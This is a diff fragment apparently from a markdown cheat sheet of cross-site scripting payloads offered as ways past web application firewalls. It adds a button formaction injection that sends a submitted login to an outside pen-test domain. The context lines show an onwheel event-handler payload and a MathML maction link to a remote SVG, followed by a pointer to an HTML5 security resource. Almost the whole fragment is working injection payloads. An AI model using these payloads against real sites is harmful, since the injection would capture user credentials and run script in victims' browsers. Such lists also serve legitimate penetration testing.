@@ -30,6 +30,7 @@ WAF got you down? There are a ton of bypasses, look at HTML5 for more ideas also
 <video onwheel=prompt(123)>
 <math><maction actiontype="statusline" 
 xlink:href="http://www.aswsec.com/pen-test/x.svg">CLICKME<mtext></mtext></maction>
+<button/formaction=https://www.aswsec.com/pen-test/validateLogin.html>Login<!--
 ```
 Here you will find a great resource: https://html5sec.org/
 
